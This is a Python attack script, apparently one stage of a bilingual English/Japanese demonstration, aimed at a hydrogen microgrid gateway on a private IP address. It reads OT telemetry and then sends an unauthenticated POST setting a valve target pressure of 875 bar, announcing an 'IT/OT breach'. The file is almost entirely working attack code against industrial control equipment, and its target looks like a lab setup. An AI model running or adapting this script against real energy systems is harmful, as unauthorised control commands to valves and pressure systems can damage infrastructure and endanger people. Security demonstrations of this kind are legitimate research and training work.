#!/usr/bin/env python3
import os
import sys
import json
import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from progress_hud import eva_progress

TARGET_IP = "192.168.1.168"
GATEWAY_URL = f"http://{TARGET_IP}:30801"

def run_stage_6():
    eva_progress(
        "⚡",
        "STAGE 6: FUJI-H2 MICROGRID IT/OT CROSSOVER (ENERGY INFRASTRUCTURE)",
        "第6段階：富士水素マイクログリッド IT/OT境界越境（エネルギー基盤）",
        "Probing Flat Network Segmentation & Sending OT Valve Telemetry",
        "フラットネットワーク分離を検証しOTバルブ制御コマンドを送信中",
        duration=1.6
    )

    try:
        # 1. Read OT Telemetry / OTテレメトリの読み取り
        get_resp = requests.get(f"{GATEWAY_URL}/api/v1/grid/fuji-h2/status", timeout=5)
        get_resp.raise_for_status()
        status_data = get_resp.json()

        print(f"🔋 [MICROGRID / マイクログリッド]: {status_data.get('grid')}")
        print(f"💧 [H2 STORAGE / 水素貯蔵率]: {status_data.get('hydrogen_storage_pct')}% | Output / 出力: {status_data.get('fuel_cell_output_kw')} kW")
        print(f"⚠️ [ARCHITECTURE FLAW / 構造的欠陥]: {status_data.get('ot_segmentation')}")

        # 2. Send Unauthenticated OT Control Command / 未認証OT制御コマンド送信
        post_resp = requests.post(
            f"{GATEWAY_URL}/api/v1/grid/fuji-h2/status",
            json={"target_pressure": 875},
            timeout=5
        )
        post_resp.raise_for_status()
        cmd_data = post_resp.json()

        print(f"🎛️ [OT COMMAND SENT / OTコマンド送信]: Valve Target Pressure ➔ {cmd_data.get('valve_pressure_bar')} bar")
        print(f"💥 [IT/OT BREACH CONFIRMED / IT/OT境界突破]: {cmd_data.get('ot_command_status')} / OTゲートウェイ認証なしで制御コマンドが実行されました！")
    except Exception as e:
        print(f"❌ [ERROR] Microgrid endpoint unreachable / マイクログリッド接続失敗: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run_stage_6()
